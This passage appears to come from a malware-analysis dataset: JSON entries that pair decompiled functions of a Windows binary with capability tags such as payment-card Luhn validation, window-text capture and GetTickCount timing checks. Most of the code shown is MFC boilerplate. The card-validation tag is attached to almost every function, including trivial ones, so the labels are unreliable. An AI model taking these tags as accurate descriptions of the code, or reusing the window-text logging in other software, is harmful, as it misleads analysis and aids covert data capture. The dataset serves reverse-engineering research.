        "decompiled_code": "\nvoid __fastcall fcn.00402440(int32_t **param_1)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    int32_t **ppiVar2;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43b428;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    uStack4 = 0;\n    ppiVar2 = param_1;\n    cVar1 = fcn.0042730a();\n    if ((cVar1 == '\\0') && ((*(*(**param_1 + 4) + 0x10 + *param_1) & 2) != 0)) {\n        fcn.00401da0();\n    }\n    uStack4 = 0xffffffff;\n    if (*(*(**param_1 + 4) + 0x28 + *param_1) != 0) {\n        fcn.0042714b(ppiVar2);\n    }\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 241
    },
    "00402790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00402790(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    uint uVar4;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_2, (param_3 >> 4) + 1 & 0xffff, 6);\n    if (iVar2 != 0) {\n        puVar3 = fcn.00401450(param_2, iVar2, param_3);\n        if (puVar3 != NULL) {\n            uVar4 = (**0x44c0d0)(0, puVar3 + 1, *puVar3, 0, 0, 0, 0);\n            iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar4);\n            if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar2) < 0) {\n                fcn.00401cf0(iVar2);\n            }\n            uVar4 = (**0x44c0d0)(0, puVar3 + 1, *puVar3, *param_1, iVar2, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar4);\n            if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n                *(*param_1 + -0xc) = iVar2;\n                *(iVar2 + *param_1) = 0;\n                return 1;\n            }\n            fcn.00401430(0x80070057);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 420
    },
    "00402a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00402a40(int32_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (param_2 == 0) {\n        fcn.00401430(0x80070057);\n    }\n    iVar2 = fcn.00418788(param_2, param_2);\n    if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar2) < 0) {\n        fcn.00401cf0(iVar2);\n    }\n    fcn.00418731(*param_1, param_2, param_2);\n    if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = iVar2;\n        *(iVar2 + *param_1) = 0;\n        return;\n    }\n    fcn.00401430(0x80070057);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 244
    },
    "00402d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get graphical window text"
        ],
        "decompiled_code": "\nuint fcn.00402d50(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    uint noname_2;\n    uint noname_3;\n    uint noname_4;\n    \n    noname_4 = 4;\n    noname_3 = 0;\n    noname_2 = param_1;\n    (*_sym.imp.USER32.dll_GetWindowTextA)();\n    fcn.00402580(0x450d00, \"Window Name: \", noname_2, noname_3, noname_4, unaff_ESI, unaff_retaddr, param_1, param_2, \n                 param_3, param_4, param_5, param_6);\n    fcn.00402920(10);\n    fcn.00401da0();\n    return 1;\n}\n",
        "token_count": 211
    },
    "0040db10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040db10(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uStack20;\n    uchar auStack16 [16];\n    \n    uStack20 = *(param_2 + 4);\n    cVar1 = fcn.0040da50(auStack16);\n    if (cVar1 != '\\0') {\n        iVar2 = (*_sym.imp.OLEAUT32.dll_VariantTimeToSystemTime)(&uStack20, param_1);\n        if (iVar2 != 0) {\n            *(param_1 + 8) = 0;\n            return param_1;\n        }\n    }\n    *(param_1 + 8) = 1;\n    return param_1;\n}\n",
        "token_count": 180
    },
    "0040dc80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0040dc80(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint unaff_EBP;\n    uint32_t unaff_ESI;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack8 = 0x43b568;\n    *in_FS_OFFSET = &uStack12;\n    if ((*(param_1 + 0x270) == param_2) && (*(param_1 + 0x274) == param_3)) {\n        *in_FS_OFFSET = uStack12;\n        return 1;\n    }\n    *(param_1 + 0x270) = param_2;\n    *(param_1 + 0x274) = param_3;\n    uVar1 = *(param_1 + 0x60);\n    uStack4 = 0;\n    iVar2 = fcn.00438818();\n    uVar3 = (*_sym.imp.USER32.dll_LoadMenuA)(*(iVar2 + 0xc));\n    iVar2 = fcn.00430186(uVar3);\n    if (iVar2 != 0) {\n        uVar3 = (*_sym.imp.USER32.dll_GetSubMenu)(unaff_EBP, 0);\n        iVar2 = fcn.0043015e(uVar3);\n        if (iVar2 != 0) {\n            (*_sym.imp.USER32.dll_SetMenuDefaultItem)(*(iVar2 + 4), *(param_1 + 0x270), *(param_1 + 0x274));\n            fcn.004301dd();\n            *in_FS_OFFSET = uVar1 & 0xffff;\n            return 1;\n        }\n    }\n    fcn.004301dd();\n    *in_FS_OFFSET = unaff_ESI;\n    return 0;\n}\n",
        "token_count": 444
    },
    "0040e160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e160(uint *param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint32_t uStack4;\n    \n    uStack8 = 0x43b5b6;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x43e098;\n    uStack4 = 1;\n    if (param_1[0x14] != 0) {\n        param_1[0x19] = 0;\n        (*_sym.imp.SHELL32.dll_Shell_NotifyIconA)(2, param_1 + 0x16);\n        param_1[0x14] = 0;\n    }\n    if (param_1[0x91] != 0) {\n        fcn.0042f834(param_1[0x91]);\n        param_1[0x91] = 0;\n    }\n    param_1[0x93] = 0;\n    param_1[0x92] = 0;\n    fcn.0042cd57();\n    uStack4 = uStack4 & 0xffffff00;\n    param_1[0x90] = 0x43e088;\n    if (param_1[0x91] != 0) {\n        fcn.0042f834(param_1[0x91]);\n    }\n    uStack4 = 0xffffffff;\n    fcn.0042d346();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 352
    },
    "0040e765": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.0040e765(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *extraout_ECX;\n    \n    piVar1 = *param_1;\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00429be4();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *piVar1;\n    return piVar1 + 2;\n}\n",
        "token_count": 107
    },
    "0040f1a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040f1a9(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    iVar1 = *param_1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00429be4();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *(iVar1 + 4);\n    return iVar1 + 8;\n}\n",
        "token_count": 105
    },
    "0040f1d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040f1d0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004197a0(param_1, param_2, 0x10);\n    return iVar1 == 0;\n}\n",
        "token_count": 63
    },
    "0040f227": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f227(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar1 = *(*in_ECX + -0xc);\n    uVar3 = arg_8h - *in_ECX;\n    iVar2 = fcn.00402110(arg_ch + uVar1);\n    if (uVar3 <= uVar1) {\n        arg_8h = uVar3 + iVar2;\n    }\n    fcn.00419370(iVar2 + uVar1, arg_8h, arg_ch);\n    fcn.00401730(arg_ch + uVar1);\n    return;\n}\n",
        "token_count": 180
    },
    "0040f2c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0040f2c9(uint *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00438808();\n    param_1[1] = iVar1;\n    param_1[2] = *(iVar1 + 0xf0);\n    *param_1 = *(iVar1 + 0xec);\n    *(iVar1 + 0xec) = param_2;\n    *(param_1[1] + 0xf0) = param_1;\n    return param_1;\n}\n",
        "token_count": 128
    },
    "004100e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004100e7(uint param_1)\n\n{\n    fcn.004192e0(param_1, 0, 0x18);\n    return param_1;\n}\n",
        "token_count": 44
    },
    "00411596": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00411596(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_4h;\n    uint var_14h;\n    uint var_ch;\n    \n    fcn.00419340();\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = 0;\n    extraout_ECX[1] = iVar1;\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    iVar1 = fcn.0042f804(iVar1 << 3);\n    *extraout_ECX = iVar1;\n    iVar1 = *extraout_ECX;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return (-(iVar1 != 0) & 0x7ff8fff2) + 0x8007000e;\n}\n",
        "token_count": 317
    },
    "004115fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004115fa(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    \n    uVar1 = (**(*arg_18h + 0x10))\n                      (arg_18h, (*(arg_8h + 0x24) != 0) * '\\x02' + '\\x02', arg_ch, arg_8h, arg_14h, arg_10h, 0);\n    if (arg_ch != 0) {\n        puVar2 = arg_8h + 0x14;\n        do {\n            fcn.0042f834(*puVar2);\n            puVar2 = puVar2 + 0xd;\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 213
    },
    "00411966": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411966(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t in_ECX;\n    \n    if (arg_1ch == 0) {\n        arg_1ch = 0;\n    }\n    else {\n        arg_1ch = arg_1ch - *(in_ECX + 8);\n    }\n    if (arg_18h == 0) {\n        arg_18h = 0;\n    }\n    else {\n        arg_18h = arg_18h - *(in_ECX + 8);\n    }\n    fcn.00411644(*(in_ECX + 0x14) * 0x34 + *(in_ECX + 0xc), arg_8h, arg_ch, arg_10h, 0, 0, 0, arg_14h - *(in_ECX + 8), \n                 arg_18h, arg_1ch, 0);\n    *(in_ECX + 0x14) = *(in_ECX + 0x14) + 1;\n    return;\n}\n",
        "token_count": 266
    },
    "004119c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nbool fcn.004119c0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_28h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    iVar1 = *(extraout_ECX + 0x38);\n    iVar2 = *(extraout_ECX + 0x30);\n    *(unaff_EBP + -0x14) = *(extraout_ECX + 0x34) - *(extraout_ECX + 0x2c);\n    *(unaff_EBP + -0x10) = iVar1 - iVar2;\n    fcn.004325f1(0);\n    *(unaff_EBP + -4) = 0;\n    fcn.00436dba(unaff_EBP + -0x14);\n    iVar1 = (**(**(extraout_ECX + 0x4c) + 0x44))(*(extraout_ECX + 0x4c), 1, unaff_EBP + -0x14);\n    if (-1 < iVar1) {\n        iVar2 = (**(**(extraout_ECX + 0x4c) + 0x48))(*(extraout_ECX + 0x4c), 1, unaff_EBP + -0x14);\n        if (-1 < iVar2) {\n            fcn.00436e48(unaff_EBP + -0x14);\n            *(extraout_ECX + 0x34) = *(extraout_ECX + 0x2c) + *(unaff_EBP + -0x14);\n            *(extraout_ECX + 0x38) = *(extraout_ECX + 0x30) + *(unaff_EBP + -0x10);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0043264c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return -1 < iVar1;\n}\n",
        "token_count": 497
    },
    "00411e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411e70(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t *var_4h;\n    \n    puVar1 = param_1 + 0x74;\n    var_4h = param_1;\n    fcn.004192e0(puVar1, 0, 0x10);\n    var_4h = NULL;\n    *puVar1 = 0x10;\n    iVar2 = (****(param_1 + 0x4c))(*(param_1 + 0x4c), 0x443dbc, &var_4h);\n    if (-1 < iVar2) {\n        (**(*var_4h + 0xc))(var_4h, puVar1);\n        (**(*var_4h + 8))(var_4h);\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "00412ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00412ca0(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_2 * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    *param_3 = *puVar1;\n    param_3[1] = puVar1[1];\n    param_3[2] = puVar1[2];\n    param_3[3] = puVar1[3];\n    *(param_3 + 4) = *(puVar1 + 4);\n    *(param_3 + 0x12) = *(puVar1 + 0x12);\n    return;\n}\n",
        "token_count": 175
    },
    "00412cc6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00412cc6(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_2 * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    *param_3 = *puVar1;\n    *(param_3 + 1) = *(puVar1 + 1);\n    return;\n}\n",
        "token_count": 111
    },
    "00412ce8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00412ce8(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_2 * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    *param_3 = *puVar1;\n    param_3[1] = puVar1[1];\n    param_3[2] = puVar1[2];\n    param_3[3] = puVar1[3];\n    return;\n}\n",
        "token_count": 135
    },
    "00412d2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00412d2d(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_2 * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    *puVar1 = *param_3;\n    puVar1[1] = param_3[1];\n    puVar1[2] = param_3[2];\n    puVar1[3] = param_3[3];\n    return;\n}\n",
        "token_count": 136
    },
    "00412d6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00412d6c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint vtime;\n    uint var_ah;\n    ushort var_6h;\n    ushort var_4h;\n    \n    fcn.004192e0(&vtime, 0, 0x10);\n    vtime._0_2_ = arg_8h;\n    vtime._2_2_ = arg_ch;\n    var_ah._0_2_ = arg_10h;\n    var_ah._2_2_ = arg_14h;\n    var_6h = arg_18h;\n    var_4h = arg_1ch;\n    iVar1 = (*_sym.imp.OLEAUT32.dll_VariantTimeToSystemTime)(&vtime);\n    *(in_ECX + 8) = iVar1 == 0;\n    return;\n}\n",
        "token_count": 240
    },
    "00412e69": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00412e69(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_retaddr;\n    \n    cVar1 = fcn.004117a2(&stack0x00000004);\n    if (cVar1 == '\\0') {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *(unaff_retaddr * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    }\n    return iVar2;\n}\n",
        "token_count": 132
    },
    "00413d1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413d1d(uint32_t arg_8h, uint32_t arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((arg_8h & 3) == 0) || (uVar1 = 0,  arg_ch == 0)) {\n        return 0;\n    }\ncode_r0x00413d41:\n    // switch table (31 cases) at 0x413db2\n    switch(*arg_10h) {\n    case 1:\n        var_4h = 3;\n        break;\n    case 2:\n    case 0x14:\n        var_4h = 5;\n        break;\n    case 3:\n    case 9:\n    case 10:\n    case 0x17:\n        var_4h = 6;\n        break;\n    default:\n        goto code_r0x00413d57;\n    case 6:\n    case 7:\n    case 8:\n    case 0xb:\n    case 0xc:\n    case 0xf:\n    case 0x10:\n    case 0x13:\n    case 0x15:\n        var_4h = 7;\n        break;\n    case 0x18:\n        var_4h = 2;\n        break;\n    case 0x19:\n        var_4h = 1;\n        break;\n    case 0x1f:\n        var_4h = 4;\n    }\n    var_20h = 0xffffffff;\n    var_24h = 3;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_ch = 0;\n    var_8h = arg_14h;\n    fcn.0041206a(&var_24h);\n    return var_ch;\ncode_r0x00413d57:\n    uVar1 = uVar1 + 1;\n    arg_10h = arg_10h + 10;\n    if (arg_ch <= uVar1) {\n        return 0;\n    }\n    goto code_r0x00413d41;\n}\n",
        "token_count": 536
    },
    "00415fea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.00415fea(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0042f302();\n    pcVar1 = *(unaff_EBP + 8);\n    extraout_ECX[10] = 0xffffffff;\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.COleControlSite.0;\n    extraout_ECX[7] = pcVar1;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[0x13] = NULL;\n    extraout_ECX[0x14] = NULL;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x16] = NULL;\n    extraout_ECX[0x17] = NULL;\n    extraout_ECX[0x18] = NULL;\n    extraout_ECX[0x1b] = NULL;\n    extraout_ECX[0x1c] = NULL;\n    extraout_ECX[0x21] = NULL;\n    extraout_ECX[0x22] = NULL;\n    extraout_ECX[0x23] = NULL;\n    extraout_ECX[0x24] = NULL;\n    extraout_ECX[0x25] = NULL;\n    extraout_ECX[0x26] = NULL;\n    extraout_ECX[0x27] = NULL;\n    fcn.004020b0();\n    *(unaff_EBP + -4) = 1;\n    extraout_ECX[0x29] = NULL;\n    fcn.0043aac5();\n    extraout_ECX[0x30] = NULL;\n    extraout_ECX[0x31] = vtable.COleControlSite::XOleClientSite.0;\n    extraout_ECX[0x32] = vtable.COleControlSite::XOleIPSite.0;\n    extraout_ECX[0x33] = vtable.COleControlSite::XOleControlSite.0;\n    extraout_ECX[0x34] = vtable.COleControlSite::XAmbientProps.0;\n    extraout_ECX[0x35] = vtable.COleControlSite::XPropertyNotifySink.0;\n    extraout_ECX[0x36] = vtable.COleControlSite::XEventSink.0;\n    extraout_ECX[0x37] = vtable.COleControlSite::XBoundObjectSite.0;\n    extraout_ECX[0x38] = vtable.COleControlSite::XNotifyDBEvents.0;\n    extraout_ECX[0x39] = vtable.COleControlSite::XRowsetNotify.0;\n    fcn.004192e0(extraout_ECX + 0x2a, 0, 0x10);\n    uVar2 = *(unaff_EBP + -0xc);\n    *(extraout_ECX + 0x2a) = 0;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 796
    },
    "004161fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: pvargDest\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.004161fa(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint pvargDest;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    *extraout_ECX = vtable.CDataSourceControl.0;\n    pcVar1 = extraout_ECX[0x16];\n    *(unaff_EBP + -4) = 0;\n    if (((pcVar1 != NULL) && (extraout_ECX[0x14] != NULL)) &&\n       (puVar2 = *extraout_ECX[0x14],  iVar5 = (***puVar2)(puVar2, 0x443dfc, unaff_EBP + -0x14),  -1 < iVar5)) {\n        *(unaff_EBP + -0x10) = 0;\n        iVar5 = (**(**(unaff_EBP + -0x14) + 0x10))(*(unaff_EBP + -0x14), 0x443f3c, unaff_EBP + -0x10);\n        if (-1 < iVar5) {\n            (**(**(unaff_EBP + -0x10) + 0x18))(*(unaff_EBP + -0x10), extraout_ECX[0x16]);\n            (**(**(unaff_EBP + -0x10) + 8))(*(unaff_EBP + -0x10));\n        }\n        (**(**(unaff_EBP + -0x14) + 8))(*(unaff_EBP + -0x14));\n    }\n    while (extraout_ECX[9] != NULL) {\n        ppiVar3 = *(extraout_ECX[7] + 8);\n        (**(**ppiVar3 + 0xbc))(ppiVar3[2], 0);\n        (*ppiVar3)[0x25] = 0;\n    }\n    *(unaff_EBP + -0x18) = extraout_ECX + 6;\n    fcn.0042a1c1();\n    if (extraout_ECX[0x10] != NULL) {\n        iVar5 = 0;\n        pcVar1 = extraout_ECX[0xe];\n        if (0 < pcVar1) {\n            *(unaff_EBP + -0x10) = 0;\n            do {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(extraout_ECX[0x10] + *(unaff_EBP + -0x10));\n                *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + 0x10;\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < extraout_ECX[0xe]);\n            pcVar1 = extraout_ECX[0xe];\n        }\n        if (pcVar1 != NULL) {\n            fcn.0042f834(extraout_ECX[0xf]);\n            fcn.0042f834(extraout_ECX[0x10]);\n        }\n    }\n    piVar6 = extraout_ECX[2];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    piVar6 = extraout_ECX[3];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    if (extraout_ECX[5] != NULL) {\n        pcVar1 = extraout_ECX[4];\n        *(unaff_EBP + -0x10) = 0;\n        if (0 < pcVar1) {\n            iVar5 = 0;\n            do {\n                iVar4 = *(*(extraout_ECX[5] + iVar5 + 0x24) + 4);\n                *(unaff_EBP + -0x14) = iVar4;\n                while (iVar4 != 0) {\n                    piVar6 = fcn.0040e765(unaff_EBP + -0x14);\n                    iVar4 = *(unaff_EBP + -0x14);\n                    *(*piVar6 + 0x94) = 0;\n                }\n                fcn.0042a1c1();\n                if (*(extraout_ECX[5] + iVar5 + 0x24) != NULL) {\n                    (**(**(extraout_ECX[5] + iVar5 + 0x24) + 4))(1);\n                }\n                *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + 1;\n                iVar5 = iVar5 + 0x28;\n            } while (*(unaff_EBP + -0x10) < extraout_ECX[4]);\n        }\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(extraout_ECX[5]);\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(extraout_ECX[0xd]);\n    }\n    if (extraout_ECX[0x15] != NULL) {\n        fcn.004152d7(*extraout_ECX[0x14]);\n        fcn.004116e8();\n    }\n    pcVar1 = extraout_ECX[0x15];\n    if (pcVar1 != NULL) {\n        fcn.004116e8();\n        fcn.0042f834(pcVar1);\n    }\n    pcVar1 = extraout_ECX[0x14];\n    if (pcVar1 != NULL) {\n        fcn.00415f7c();\n        fcn.0042f834(pcVar1);\n    }\n    piVar6 = extraout_ECX[0x13];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    piVar6 = extraout_ECX[0x12];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042a2a9();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1529
    },
    "00416bfb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
